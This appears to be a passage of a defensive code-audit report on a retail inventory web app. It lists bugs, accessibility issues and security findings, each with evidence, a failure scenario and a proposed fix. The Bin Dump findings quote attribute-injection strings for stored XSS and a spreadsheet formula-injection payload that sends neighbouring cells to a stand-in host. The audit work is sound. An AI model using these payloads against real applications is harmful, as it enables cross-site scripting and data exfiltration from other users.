**Evidence.** `<th class="stick invsort" style="left:34px" onclick="sortInvTable('name')">` (2428-2435): not focusable, no aria-sort. `#inv-edit-modal` and `#inv-delete-modal` (2591, 2636) have no role="dialog", aria-modal, focus move or Escape handling; the global Escape handler (~34847) covers only the hourly modals. #inv-status, #inv-sale-status, #inv-view-status and #inv-sched-status have no aria-live. The 'Discount' caption is a `<span class="invf-l">` (2507), so `#inv-sale-discount-val` has no accessible name.

**Failure scenario.** A keyboard user can't sort the table or close the Edit modal with Escape. A screen-reader user hears nothing when 'Creating…' turns into a result and meets an unnamed number field in the sale composer.

**Proposed fix.** Wrap each sortable header's text in `<button type="button" class="invsort-b">` and set `aria-sort` on the th in renderInvTable. Give both modals `role="dialog" aria-modal="true" aria-labelledby`, focus the first field on open, and add them to the Escape handler. Add `aria-live="polite"` to the four status containers and `aria-label="Discount value"` to the input.

<a id="inventory-28"></a>
#### inventory-28 — Ticking a row doesn't apply the green 'Selected for a sale' tint the legend promises until the next full render

*low · minor · ui-ux · confidence high · `index.html:31298` · unverified*

**Evidence.** The `sel` class is added only in renderInvTable (30918-30919). toggleRowSelect (31298-31313) and toggleSelectAll (31315-31330) update the Map and checkbox only. The legend (2445) says the green swatch means 'Selected for a sale'. The header select-all box is also not re-synced after a search re-render.

**Failure scenario.** An admin ticks 12 rows in a long list and can't see which rows are selected without looking for the small checkboxes. The tint appears only after they type in search.

**Proposed fix.** In both functions add `cb.closest('tr')?.classList.toggle('sel', cb.checked)`. At the end of renderInvTable, set `el('inv-sel-all').checked` from the rendered checkboxes.

<a id="inventory-29"></a>
#### inventory-29 — Dark mode: inline light-theme borders on the Preview bar and legend swatches can't be overridden by the dark rules

*low · minor · ui-ux · confidence high · `index.html:2536` · unverified*

**Evidence.** index.html:2536 `<div class="invp-bar" style="border-top:1px solid rgba(20,16,8,.10);border-bottom:0">`: a light hairline written inline, invisible on #16203a. The legend swatches at 2365-2367 and 2444-2445 set `border-color:rgba(22,101,52,.28)` and similar inline, which beats `.dark .invlg-sw{border-color:rgba(255,255,255,.16)}` (2001). DESIGN.md §4.8 trap 3: state a colour for BOTH themes on the panel, never inline-only.

**Failure scenario.** In dark (and OLED) the Preview section loses its separator and the legend swatch outlines disappear into the panel.

**Proposed fix.** Move the preview bar's style into a class, e.g. `.invp-bar.sep{border-top:1px solid rgba(20,16,8,.10);border-bottom:0}` with `.dark .invp-bar.sep{border-top-color:rgba(255,255,255,.09)}`. Give the swatches modifier classes (`.invlg-sw.ok/.dupe/.bad`) with light and dark border values, in place of the inline styles.

<a id="inventory-22"></a>
#### inventory-22 — Sale activation/revert is not idempotent: rows aren't claimed before the Clover write, so overlapping runs or a failed D1 update double-discount and later 'revert' to the sale price

*low · major · bug · confidence medium · `worker.js:1585` · unverified*

**Evidence.** worker.js:1578-1599: the pending rows are SELECTed, then for each row `getCloverItem` → `setCloverItemFields({price: saleCents, name})` → `UPDATE ... status='active' WHERE id=?`, with no `AND status='pending'` claim. A second run inside that window (cron plus a manual `run-sale-scheduler-now` at 28056, or a tick slowed by 429 retries), or a D1 UPDATE failure after the Clover write, re-reads the already-discounted price, discounts it again and stores `original_price` = the sale price. Cancel (28011-28014) can also race: it marks the row cancelled, and the activation's unconditional UPDATE sets it back to active.

**Failure scenario.** A superuser presses 'run scheduler now' at the same minute the cron fires. An item goes $10 → $8 → $6.40, the name becomes 'SALE SALE X (was $10.00) (was $8.00)', and at ends_at it is 'restored' to $8.00 permanently.

**Plan.** Future plan (worker; the frontend needs labels first). (1) Frontend first, inert: add 'activating'/'reverting' to SCHED_STATUS_LABEL and SCHED_STATUS_CLASS so the new statuses read correctly. (2) Worker: claim each row with `UPDATE sale_schedules SET status='activating' WHERE id=? AND status='pending'` and continue only when meta.changes === 1. Make the final update `WHERE id=? AND status='activating'`, and if a cancel won, revert immediately. Do the same for revert. (3) Recovery: a row left in 'activating' for more than 5 min re-reads Clover (SALE prefix present?) and settles to active or pending. Risks: stuck claims, and the list query's rank table needs the new statuses. Verify with the harness: run processSaleSchedules twice concurrently against a stub Clover and assert a single discount and one POST per item.

<a id="inventory-23"></a>
#### inventory-23 — create-clover-item's duplicate guard is still read-then-write with no lock: two concurrent submits (two tabs/admins, or a retry while the first is still running) can both create

*low · major · bug · confidence medium · `worker.js:19940` · unverified*

**Evidence.** worker.js:19940 `const dup = await cloverCodeInUse(env, s, code, headers);` pages the whole catalogue (about 2 requests at BL1's size) and then POSTs the item at 19954. Nothing is reserved in between. tasks/lessons.md (2026-09-21) documents that exactly this shape produced five duplicates under concurrency. Same-tab double-submit is blocked by the synchronous `btn.disabled = true` (index.html:30671), and one request covers all stores, so the remaining exposure is cross-request.

**Failure scenario.** Two admins add the same new product within a few seconds, or a phone retries after 'Load failed' while the first request is still paging Clover. Both scans see the code free, and the store gets two items on one code.

**Plan.** Future plan. (1) Migration first: `CREATE TABLE clover_create_locks(store TEXT, code TEXT, created_at TEXT, PRIMARY KEY(store, code))`. (2) Worker: `INSERT INTO clover_create_locks ...` before the scan; on a UNIQUE conflict with a lock younger than 2 min, return `{duplicate:false, stage:'in-progress'}` ('another create for this code is running'). Delete stale locks. Write the lock handling so it fails closed if the table is missing, and deploy it after the migration. (3) Optional frontend idempotency key. The frontend needs no change because it already renders unknown stages as failed. Verify with the harness: two concurrent requests against a stub Clover whose page read is delayed produce exactly one POST /items.

</details>

<a id="bin-dump"></a>
### Bin Dump

Bin Dump is carefully built. The worker gates match the frontend exactly: bdCanDelete matches FINANCIAL_ROLES, bdCanEdit matches ACTION_PAGE edit, and photo and list are view-level with the store taken from the row. The lightbox maths is pinned by tests, CSV truncation is reported, every fetch checks res.ok and JSON parsing, and every named colour pair passes 4.5:1 in light, dark and OLED except one (the DUP badge on an edited row). The biggest risk is that escapeHtml does not escape double quotes, and this page puts it inside value="" and title="" attributes. I proved in Chromium that `TV 55" LED` is saved back as `TV 55`, and that a barcode can inject attributes, which is stored XSS that any Bin Dump editor, including an associate, can plant for managers and admins. Next come three wrong-data paths: an out-of-order bdLoad can show another store's pallets under the selected store, a pallet is logged silently into stores[0] under "All stores" or after the store select resets, and a failed image decode reuses the previous pallet's photo. The oldest week in the log is also always partial and the 500-row cap is ignored. On phones, the verify inputs are 14px (iOS zooms on focus), the footer buttons are 31px tall, EDIT sits about 440px off-screen, and on edited rows the sticky column is see-through. All confirmed with a stubbed 393px browser run (no network) and node checks. test-bin-dump.mjs passes 283/283 at HEAD.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [bin-dump-1](#bin-dump-1) | high | minor | security | escapeHtml inside value="" / title="" attributes: values with a double quote are cut short on save, and attributes can be injected (stored XSS) | `index.html:27596` | **fixed 2026-09-23** |
| [bin-dump-2](#bin-dump-2) | medium | minor | bug | bdLoad has no request ordering: a slow earlier response overwrites the store now selected | `index.html:28032` | **fixed 2026-09-23** |
| [bin-dump-3](#bin-dump-3) | medium | minor | bug | The pallet's store is never shown: "All stores" silently logs into stores[0], and the select resets to stores[0] on every visit | `index.html:27531` | **fixed 2026-09-23** |
| [bin-dump-4](#bin-dump-4) | medium | minor | bug | If a photo fails to decode, the verify form shows and uploads the PREVIOUS pallet's photo | `index.html:27566` | **fixed 2026-09-23** |
| [bin-dump-5](#bin-dump-5) | medium | minor | bug | The log's oldest week is always partial, and the 500-row cap is dropped silently | `index.html:28037` | unverified |
| [bin-dump-8](#bin-dump-8) | medium | minor | ui-ux | Verify and edit inputs and the store select are 14px, so iOS zooms the page on every field | `index.html:2861` | unverified |
| [bin-dump-9](#bin-dump-9) | medium | minor | accessibility | The modal's action buttons are 31px tall and row buttons 24px, below 44px | `index.html:2766` | unverified |
| [bin-dump-10](#bin-dump-10) | medium | minor | ui-ux | On a phone the EDIT/VIEW button is about 440px off-screen at the end of every row | `index.html:28148` | **fixed 2026-09-23** |
| [bin-dump-13](#bin-dump-13) | medium | minor | ui-ux | The tag read has no timeout or cancel, and 'Reading tag…' hides Enter Manually | `index.html:27570` | **fixed 2026-09-23** |
| [bin-dump-17](#bin-dump-17) | medium | minor | security | The CSV export writes free text raw: formula injection, and \r is not quoted | `index.html:28206` | unverified |
| [bin-dump-6](#bin-dump-6) | medium | major | security | Associates with an edit grant can approve their own duplicate pallet with a bare allow_duplicate boolean | `worker.js:24501` | unverified |
| [bin-dump-7](#bin-dump-7) | low | minor | ui-ux | 'Changes saved.' and 'Deleted · …' are written into the hidden Scan pane | `index.html:27903` | **fixed 2026-09-23** |
| [bin-dump-11](#bin-dump-11) | low | minor | ui-ux | The sticky 'When' column is see-through on edited rows, so scrolled cells show through it | `index.html:2845` | **fixed 2026-09-23** |
| [bin-dump-12](#bin-dump-12) | low | minor | accessibility | The DUP badge measures 4.18:1 on an edited row in light mode | `index.html:2879` | **fixed 2026-09-23** |
| [bin-dump-14](#bin-dump-14) | low | minor | ui-ux | Retake / Take Photo closes the form before the camera opens, so cancelling the camera loses everything typed | `index.html:27540` | **fixed 2026-09-23** |
| [bin-dump-15](#bin-dump-15) | low | minor | bug | The busy flag stays set through the post-submit list reload: a photo taken then is silently dropped, and Cancel stays live during Submit | `index.html:27559` | **fixed 2026-09-23** |
| [bin-dump-16](#bin-dump-16) | low | minor | performance | Every submit makes three serial round trips, including a duplicate pre-check that is pointless without a barcode or photo | `index.html:27906` | unverified |
| [bin-dump-18](#bin-dump-18) | low | minor | bug | bdThisWeek uses the device's time zone while the worker files weeks in Eastern | `index.html:28070` | unverified |
| [bin-dump-19](#bin-dump-19) | low | minor | accessibility | Keyboard and focus: the modal takes no focus and has no Escape, the store select is unlabelled, and toggling a week loses focus | `index.html:27707` | unverified |
| [bin-dump-20](#bin-dump-20) | low | minor | bug | Identifier inputs allow autocapitalise and autocorrect, and the exact-match barcode check then misses a typed duplicate | `index.html:27595` | **fixed 2026-09-23** |
| [bin-dump-21](#bin-dump-21) | low | minor | bug | Editing any field of a row that already shares a barcode raises the duplicate prompt on every save | `worker.js:24650` | unverified |
| [bin-dump-22](#bin-dump-22) | low | minor | ui-ux | The duplicate prompt makes the override the green, focused default | `index.html:28029` | **fixed 2026-09-23** |
| [bin-dump-23](#bin-dump-23) | low | minor | ui-ux | View-only accounts are told to 'tap Edit' and 'Press Begin' | `index.html:28100` | **fixed 2026-09-23** |
| [bin-dump-24](#bin-dump-24) | low | minor | ui-ux | Opening a photoless (typed) row hides who logged it and when | `index.html:27655` | unverified |
| [bin-dump-25](#bin-dump-25) | low | minor | ui-ux | In the installed PWA, the verify modal's header and × sit under the status bar / Dynamic Island | `index.html:3015` | unverified |
| [bin-dump-26](#bin-dump-26) | low | minor | performance | binDumpWeekOf builds a new Intl.DateTimeFormat for every row | `worker.js:7688` | unverified |
| [bin-dump-27](#bin-dump-27) | low | minor | ui-ux | Lightbox wheel zoom ignores the wheel delta, so trackpad scroll or pinch jumps straight to 8× | `index.html:27852` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="bin-dump-1"></a>
#### bin-dump-1 — escapeHtml inside value="" / title="" attributes: values with a double quote are cut short on save, and attributes can be injected (stored XSS)

*high · minor · security · confidence high · `index.html:27596` · unverified · fixed 2026-09-23*

**Evidence.** escapeHtml (index.html:7753-7757) serialises a text node, so it escapes & < > but never the double quote. This page uses it inside double-quoted attributes: 27596 `value="${escapeHtml(val == null ? '' : String(val))}"` (bdFieldRow, used by both the verify form and the edit form) and 28141 `title="Barcode ${escapeHtml(r.barcode)} is on more than one logged pallet"`. There is no CSP (dist/_headers only sets Cache-Control). Browser probe (Chromium, list stubbed): the barcode `x" data-pwned="1` rendered `<span class="bd-dup" title="Barcode x" data-pwned="1 is on …">`, and 2 injected attributes were found in #bd-weeks. Opening EDIT on a row with pallet_name `TV 55" LED` showed the input value `TV 55`. Pressing Save posted `{pallet_name:"TV 55", barcode:"x"}` to bin-dump-update.

**Failure scenario.** (a) Data corruption: a pallet name with an inch mark (TV/monitor pallets, `55"`), whether read by the tag scanner or typed, is cut at the quote in the verify form and the edit form. Submit or Save then writes the shortened value, and a shortened barcode changes duplicate matching. (b) Stored XSS: an associate with a Bin Dump edit grant logs two pallets (via "Log it anyway") whose barcode is `"style=position:fixed;inset:0 onmouseover=…` (under the 60-character cap). The DUP span then covers the screen for the next manager or admin who opens the Log. Alternatively they put `" onfocus=…` in a pallet name, which runs when a manager taps that field under EDIT. The script can call the API with the victim's cookies (credentials:'include').

**Proposed fix.** Add `const bdAttr = s => escapeHtml(s).replace(/"/g, '&quot;');` next to bdFieldRow, and use bdAttr at 27596 (value=) and 28141 (title=). Root-cause option: make escapeHtml itself also map `"` to &quot; and `'` to &#39;. That changes nothing in text contexts and fixes all 39 `="…${escapeHtml(` call sites app-wide, so coordinate it with the other page reviews. Add a test: `TV 55" LED` survives bdFieldRow, and the parsed input's value is identical.

<a id="bin-dump-2"></a>
#### bin-dump-2 — bdLoad has no request ordering: a slow earlier response overwrites the store now selected

*medium · minor · bug · confidence high · `index.html:28032` · unverified · fixed 2026-09-23*

**Evidence.** bdLoad (28032-28051) reads sel.value, awaits the fetch, then assigns `bdState.rows = j.rows` and calls bdRenderLog with no sequence check. bdRenderLog decides whether to show the Store column from the CURRENT select, `const multi = el('bd-store').value === 'ALL'` (28117). bdLoad is called from bdStoreChange (27526), Refresh (2993), after every submit and delete, and from initBinDump. Probe: ALL delayed 700 ms, then BL1 selected immediately. Result: the select read BL1, but rows were [BL1 TV…, BL1 SNACKS, BL4 DUPONT PALLET], the units tile read 1,041 (BL1 alone is 42), and there was no Store column.

**Failure scenario.** A multi-store manager on slow warehouse Wi-Fi switches from "All stores" to "Coliseum" (or taps Refresh twice). The slower All-stores response lands last. The Coliseum view then lists Dupont's pallets with no Store column, and the This-week tiles credit every store's units to Coliseum. EDIT on one of those rows edits another store's pallet while the header says Coliseum.

**Proposed fix.** Add a module-level `let bdLoadSeq = 0;`. In bdLoad: `const my = ++bdLoadSeq; const store = sel.value;`, and after each await (in both try and catch) `if (my !== bdLoadSeq) return;`. Pass the store the request was made for into bdRenderLog (`multi = store === 'ALL'`) instead of re-reading the select. Frontend only.

<a id="bin-dump-3"></a>
#### bin-dump-3 — The pallet's store is never shown: "All stores" silently logs into stores[0], and the select resets to stores[0] on every visit

*medium · minor · bug · confidence high · `index.html:27531` · unverified · fixed 2026-09-23*

**Evidence.** bdScanStore: `if (v && v !== 'ALL') return v; const s = bdStores(); return s.length ? s[0] : '';`. initBinDump runs on every navigateToPage('bin-dump') (12024) and does `if (stores.length) sel.value = stores[0];` (27508), dropping the previous choice. The Scan tab stays usable under All stores. Neither the modal title ('Verify pallet tag' / 'Log pallet by hand', 27607) nor the success line (`Pallet logged · ${pallet_name} · n units.`, 27939) names the store. Probe: select ALL, then Enter Manually, then Submit. bin-dump-log received store "BL1", and the status read "Pallet logged · BL4 PALLET."

**Failure scenario.** A manager who holds BL1 and BL4 and works at Dupont picks Dupont, opens Inventory Receiver, and comes back. The select has quietly reset to Coliseum, and every pallet they then log is filed under Coliseum. Dupont's weekly units are understated and Coliseum's overstated. The cross-store duplicate check cannot catch it because this is the first log. The same happens to an admin who reviews "All stores" and then switches to Scan.

**Proposed fix.** Frontend only: (1) In bdOpenVerify, add the store to the title (`… · ${BD_LABELS[bdScanStore()] || bdScanStore()}`) and add it to the success status. (2) When the select is 'ALL' and stores.length > 1, make bdBegin and bdManual stop with bdSetStatus('Pick the store this pallet is going into first.', 'err') instead of falling back to stores[0]. (3) In initBinDump, keep the previous selection when it is still in `stores` (read sel.value before rebuilding the options, or use sessionStorage inside try/catch).

<a id="bin-dump-4"></a>
#### bin-dump-4 — If a photo fails to decode, the verify form shows and uploads the PREVIOUS pallet's photo

*medium · minor · bug · confidence high · `index.html:27566` · unverified · fixed 2026-09-23*

**Evidence.** bdPhoto: `const b64 = await psShrink(f); bdState.photo = b64;`. When psShrink rejects ('that image could not be opened'), bdState.photo keeps its old value. The catch then calls bdOpenVerify, which sets `el('bd-m-photo').src = bdState.photo ? `data:…${bdState.photo}` : ''` (27617), and bdSubmit sends `image_b64: bdState.photo` (27935). bdState.photo is cleared only after a successful submit (27942) and in bdManual. Cancel and backing out at the duplicate prompt both leave it set. Probe: with bdState.photo='AAAA', bdPhoto on an undecodable .heic left #bd-m-photo src = data:image/jpeg;base64,AAAA, kept #bd-m-shot visible, and showed "Couldn't read the tag — that image could not be opened".

**Failure scenario.** A manager scans pallet A, backs out at "Duplicate pallet" (which the code calls the expected answer), and cancels. Next they pick pallet B's photo, which cannot be decoded (a HEIC from a desktop Chrome file picker, or an oversized image). The form shows A's tag as B's photo, the lightbox invites them to read A's digits, and Submit stores A's photo on B's row, even though that photo is the evidence the log keeps to settle a disputed digit.

**Proposed fix.** In bdPhoto, right after `if (!f || bdState.busy) return;`, add `bdState.photo = null;` (before psShrink). Add a test: after a decode failure, #bd-m-shot is hidden or empty and bdSubmit sends no image_b64.

<a id="bin-dump-5"></a>
#### bin-dump-5 — The log's oldest week is always partial, and the 500-row cap is dropped silently

*medium · minor · bug · confidence high · `index.html:28037` · unverified*

**Evidence.** bdLoad requests `bin-dump-list&store=…` with no weeks, so the worker defaults to 8 and filters `logged_at >= now − 56 days` (worker.js:24604). That cutoff is not aligned to a Sunday. bdRenderLog renders every week group with `${rows.length} pallets · ${units} units` (28127). On Tue 2026-09-22 the cutoff is Tue 07-28, giving 9 groups; the oldest, 'Week of Jul 26 – Aug 1', holds only Tue–Sat rows but is labelled as the whole week. The worker also caps at limit 500 (24601) and returns `truncated`, but bdLoad never reads j.truncated. BL1 alone logged 16 pallets on 2026-09-10 and a TJX unload is about 20, so one store can pass 500 rows in 8 weeks, and "All stores" much sooner.

**Failure scenario.** Every load shows the oldest week's pallets and units as a fraction of the truth. Once the cap is hit, the oldest weeks vanish or come up short, the tab badge reads 500, and the status says "500 pallets across N weeks" as if that were complete.

**Proposed fix.** Frontend only: request `&weeks=9` and drop rows whose `week` is earlier than the Sunday 7 weeks before bdThisWeek(), so exactly 8 complete weeks (including the current one) render. Store `bdState.truncated = !!j.truncated`. When it is true, append "— older pallets are not shown; use Export CSV for the full log" to #bd-log-status and label the oldest rendered group as partial.

<a id="bin-dump-8"></a>
#### bin-dump-8 — Verify and edit inputs and the store select are 14px, so iOS zooms the page on every field

*medium · minor · ui-ux · confidence high · `index.html:2861` · unverified*

**Evidence.** `.bd-in{width:100%;font:inherit;font-size:14px;…}` (2861). #bd-store uses `text-sm` (2936). Probe computed fontSize was 14px for both. The viewport meta (line 5) has no maximum-scale. The repo's own rule appears at 1280 and 4741: "16px, not 15: iOS zooms the whole page into any smaller input on focus."

**Failure scenario.** An iPhone user at a pallet taps any of the eight verify fields to fix a digit. Safari zooms in, pushing the sticky Submit/Cancel footer and the right half of the form off-screen, and they have to pinch out after every correction, on the one page built for phones.

**Proposed fix.** Change `.bd-in` to font-size:16px, and give #bd-store `text-base` (or add `#page-bin-dump select{font-size:16px}`).

<a id="bin-dump-9"></a>
#### bin-dump-9 — The modal's action buttons are 31px tall and row buttons 24px, below 44px

*medium · minor · accessibility · confidence high · `index.html:2766` · unverified*

**Evidence.** The modal footer (Retake, Delete, Cancel, Submit) and the × all use `.bd-sm{padding:6px 11px;font-size:11.5px}` (2766). `.bd-row-btn{…font-size:10.5px…padding:3px 8px}` (2847-2849). `.bd-lb-b{height:36px}` (2919). Probe at 393px: Submit 116×31, × 34×31, Delete 68×31, row EDIT 47×24. Cancel and Submit sit 7px apart.

**Failure scenario.** On a phone, often with gloves, a manager going for Submit hits Cancel, which throws away a verified or hand-typed pallet. Hitting a 24px EDIT or VIEW inside a horizontally scrolled table takes several attempts.

**Proposed fix.** Scoped CSS: `#bd-modal .bd-bar .bd-btn{min-height:44px;padding:10px 16px;font-size:14px}`, `.bd-row-btn{min-height:32px;padding:6px 12px}` (and see bin-dump-10 for making the whole row tappable), and `.bd-lb-b{height:44px;min-width:44px}`.

<a id="bin-dump-10"></a>
#### bin-dump-10 — On a phone the EDIT/VIEW button is about 440px off-screen at the end of every row

*medium · minor · ui-ux · confidence high · `index.html:28148` · unverified · fixed 2026-09-23*

**Evidence.** The only way to open a row is `<td><button class="bd-row-btn" onclick="bdOpenEdit(${r.id})">…` in the last column. The table has `table.bd-tbl{…min-width:780px}` (2827). Probe at 393px: the .bd-scroll client width is 343 and its scroll width is 787.

**Failure scenario.** To check or fix a pallet on a phone, the user has to scroll the week's table sideways to the far end, find the row again, and hit a 24px button. Each week table keeps its own scroll position, so this repeats per week.

**Proposed fix.** Make the sticky 'When' cell the opener, e.g. `<td class="stick"><button type="button" class="bd-when-btn" onclick="bdOpenEdit(${r.id})">${escapeHtml(bdWhen(r.logged_at))}</button></td>`, styled as text with an underline or chevron. Alternatively put `onclick` on the <tr> and keep the trailing button for keyboard users. Frontend only.

<a id="bin-dump-13"></a>
#### bin-dump-13 — The tag read has no timeout or cancel, and 'Reading tag…' hides Enter Manually

*medium · minor · ui-ux · confidence high · `index.html:27570` · unverified · fixed 2026-09-23*

**Evidence.** `const r = await fetch(`${WORKER_BASE}?action=bin-dump-scan`, { method:'POST', … body: JSON.stringify({ image_b64: b64, … }) })` has no signal, and the worker's Anthropic fetch (worker.js:24418) has no timeout either. bdShow('reading') hides #bd-begin, which contains both Begin and #bd-manual (2957-2962). #bd-reading has no cancel control.

**Failure scenario.** On weak warehouse Wi-Fi, the ~250 KB upload stalls or the vision call hangs. The spinner reads "Pulling the seven fields" indefinitely, the user cannot fall back to Enter Manually, and the only way out is reloading the app, which loses the photo.

**Proposed fix.** Add `signal: (typeof AbortSignal !== 'undefined' && AbortSignal.timeout) ? AbortSignal.timeout(45000) : undefined` to the scan fetch. The existing catch already opens the form with the photo kept. Map `e.name === 'TimeoutError' || e.name === 'AbortError'` to "The tag reader took too long". Optionally add a Cancel link in #bd-reading driven by an AbortController.

<a id="bin-dump-17"></a>
#### bin-dump-17 — The CSV export writes free text raw: formula injection, and \r is not quoted

*medium · minor · security · confidence high · `index.html:28206` · unverified*

**Evidence.** `const cell = v => { const s = v == null ? '' : String(v); return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s; };`. Values starting with = + - @ go out unchanged, and \r is not in the quoting class (downloadWrsAsCsv's csvCell at ~15482 does include \r). pallet_name (160 chars), po, sup_ref, created_by_tag and truck_no are free text any Bin Dump editor can type, including associates with an edit grant.

**Failure scenario.** An editor sets a pallet name to `=HYPERLINK("https://x.example/?"&B2&C2,"see tag")`. When a manager opens the export in Excel it shows a link that sends neighbouring cells off-site when clicked. An innocent name like `-SNACKS` becomes #NAME?. A stray \r in an OCR'd name splits the row.

**Proposed fix.** `const cell = v => { let s = v == null ? '' : String(v); if (typeof v === 'string' && /^[=+\-@\t\r]/.test(s)) s = "'" + s; return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s; };`. It applies to strings only, so the numeric units column is untouched. While there, consider an ET-local 'logged_local' column: logged_at is UTC ISO, so a Saturday 9:30 pm ET pallet reads as Sunday next to a week column naming the previous week.

<a id="bin-dump-6"></a>
#### bin-dump-6 — Associates with an edit grant can approve their own duplicate pallet with a bare allow_duplicate boolean

*medium · major · security · confidence medium · `worker.js:24501` · unverified*

**Evidence.** bin-dump-log (24500-24501) and bin-dump-update (24650-24651) accept `body?.allow_duplicate !== true` from anyone who passes requirePage('bin-dump','edit'). ACTION_PAGE (14646-14650) has let associates with an edit grant reach both actions since migration-061 (2026-09-09). The Inventory Receiver comment (24737-24744) relies on the opposite: "Bin Dump takes `allow_duplicate: true`, which is right there because Bin Dump is already gated to manager+ … Receiving is open to associates by page grant, so a boolean would be consent that anyone who can POST can mint." The tests pin the override only for u-mgr1 (test-bin-dump.mjs:620).

**Failure scenario.** An associate re-scans a pallet that was already dumped and taps "Log it anyway". Its units are counted into the bins twice with no manager involved, and the only trace is a DUP chip in the log. On the Inventory Receiver, the same decision about the same tag needs a manager's name and six-digit PIN.

**Plan.** Future plan. Brian decides first whether associates may approve their own duplicate (if yes, fix the IR comment and pin the choice in a test). If no: (1) an additive migration adds dup_approved_by and dup_reason to bin_dumps. (2) Frontend: on a new 403 NEED_APPROVAL, show the manager-approval sheet the IR page uses (approvers list plus PIN), then resend with `approval:{name,pin}`. Old workers ignore the field, so this is safe to ship first. (3) Worker last, since it is the side that stops being backward-compatible for associate clients: when `!isAdminSecret && !canSeeFinancials(currentUser)`, ignore allow_duplicate and require an approval checked by the shared verifyApproval (hoisted above the Bin Dump handlers), recording the approver on the row. Risks: associates are blocked mid-unload when no manager is on site; cached old PWAs show a generic error until they reload. Verify with a test that an associate sending allow_duplicate gets 403 NEED_APPROVAL and a manager is unchanged, plus a browser run as an associate.

<a id="bin-dump-7"></a>
#### bin-dump-7 — 'Changes saved.' and 'Deleted · …' are written into the hidden Scan pane

*low · minor · ui-ux · confidence high · `index.html:27903` · unverified · fixed 2026-09-23*

**Evidence.** The edit path calls `bdSetStatus('Changes saved.', 'ok')` (27903) and bdDelete calls `bdSetStatus(`Deleted${what ? ` · ${what}` : ''}.`, 'ok')` (27696). bdSetStatus writes #bd-status, which sits inside #bd-pane-scan (2970). Edit and delete can only be reached from Log rows, so that pane is hidden at the time. The file already documents this trap for export (28165-28167) and fixed it there with bdSetLogStatus.

**Failure scenario.** A manager saves a correction or deletes a pallet from the Log tab and gets no confirmation. Later, on the Scan tab, a stale "Deleted · PALLET AMAZON IND8 …" pill is sitting under Begin.

**Proposed fix.** In both paths, show the message after `await bdLoad()` (which overwrites #bd-log-status), using `bdState.tab === 'log' ? bdSetLogStatus(msg + ' ' + el('bd-log-status').textContent) : bdSetStatus(msg, 'ok')`, or put it in a dedicated line.

<a id="bin-dump-11"></a>
#### bin-dump-11 — The sticky 'When' column is see-through on edited rows, so scrolled cells show through it

*low · minor · ui-ux · confidence high · `index.html:2845` · unverified · fixed 2026-09-23*

**Evidence.** `table.bd-tbl tr.edited td,table.bd-tbl tr.edited .stick{background:rgba(245,158,11,.16)}` (specificity 0,3,2) beats `table.bd-tbl .stick{background:#fff}` (0,2,1). The probe's computed .stick background on an edited row was `rgba(245, 158, 11, 0.16)`. This is DESIGN.md §4.8 trap 2 ("A position: sticky column needs its own opaque background").

**Failure scenario.** On a phone, where the table scrolls from 343px to 787px, scrolling an amber 'edited' row left slides the Item # and Pallet text under the See-through timestamp cell, printing over the timestamp on exactly the rows marked as corrected.

**Proposed fix.** `table.bd-tbl tr.edited .stick{background:linear-gradient(rgba(245,158,11,.16),rgba(245,158,11,.16)),#fff}` and `.dark table.bd-tbl tr.edited .stick{background:linear-gradient(rgba(245,158,11,.14),rgba(245,158,11,.14)),rgb(var(--op-panel))}`. It is opaque and follows OLED because it composes over the token.

<a id="bin-dump-12"></a>
#### bin-dump-12 — The DUP badge measures 4.18:1 on an edited row in light mode

*low · minor · accessibility · confidence high · `index.html:2879` · unverified · fixed 2026-09-23*

**Evidence.** `.bd-dup{…background:rgba(192,57,43,.10);…color:#c0392b}` is layered over the amber `tr.edited td` wash rgba(245,158,11,.16) on #fff. Computed: #c0392b on that composite is 4.18:1 (4.69 on a plain row); dark is 4.51:1 and OLED 5.11:1. A duplicate created through edit ("Save anyway") always sets edited_at, so those DUP chips are always on amber rows. The text is 9px bold, so the 4.5:1 threshold applies.

**Failure scenario.** The DUP chip, the log's only visual flag for a double-counted pallet, is below AA in light mode on exactly the rows where it is most likely to appear.

**Proposed fix.** Use `.bd-dup{color:#a93226}` in light mode (5.09:1 on the edited composite, 5.71:1 on plain) and leave dark (#f87171) unchanged.

<a id="bin-dump-14"></a>
#### bin-dump-14 — Retake / Take Photo closes the form before the camera opens, so cancelling the camera loses everything typed

*low · minor · ui-ux · confidence high · `index.html:27540` · unverified · fixed 2026-09-23*

**Evidence.** `function bdBegin() { bdState.manual = false; bdCloseModal(); (syncCameraCapture(el('bd-photo')), el('bd-photo').click()); }`. The modal's Retake button calls bdBegin (3041). If the picker is cancelled, no change event fires, so bdPhoto never runs.

**Failure scenario.** A manager halfway through correcting fields (or typing a whole tag in manual mode) taps Take Photo, then backs out of the camera. The form, and everything they typed, is gone, and they have to start over.

**Proposed fix.** Remove bdCloseModal() and the manual reset from bdBegin. In bdPhoto, after `if (!f || bdState.busy) return;`, call `bdCloseModal(); bdState.manual = false;`. The new read rebuilds the form either way, and a cancelled camera leaves the form intact.

<a id="bin-dump-15"></a>
#### bin-dump-15 — The busy flag stays set through the post-submit list reload: a photo taken then is silently dropped, and Cancel stays live during Submit

*low · minor · bug · confidence high · `index.html:27559` · unverified · fixed 2026-09-23*

**Evidence.** bdSubmit keeps `bdState.busy = true` until `await bdLoad()` (27945) resolves, releasing it only in finally. bdPhoto clears `input.value` and then `if (!f || bdState.busy) return;` with no message. During a submit the footer Cancel and × stay enabled, and the success path's `bdCloseModal()` (27944) closes whatever form is open at that moment.

**Failure scenario.** On slow Wi-Fi, a manager submits, immediately taps Begin and shoots the next tag while the 500-row list is still loading. The photo is thrown away with no feedback and the camera has to be reopened. Or they tap Cancel then Enter Manually during a slow submit; when the first submit lands it closes the new form they are typing in.

**Proposed fix.** In bdSubmit and bdDelete, release busy and re-enable the button before refreshing: `bdState.busy = false; btn.disabled = false; bdLoad();` (not awaited). In bdPhoto, replace the silent return with `bdSetStatus('Still saving the last pallet — try again in a moment.', 'err')`. Disable the footer Cancel and × while busy.

<a id="bin-dump-16"></a>
#### bin-dump-16 — Every submit makes three serial round trips, including a duplicate pre-check that is pointless without a barcode or photo

*low · minor · performance · confidence high · `index.html:27906` · unverified*

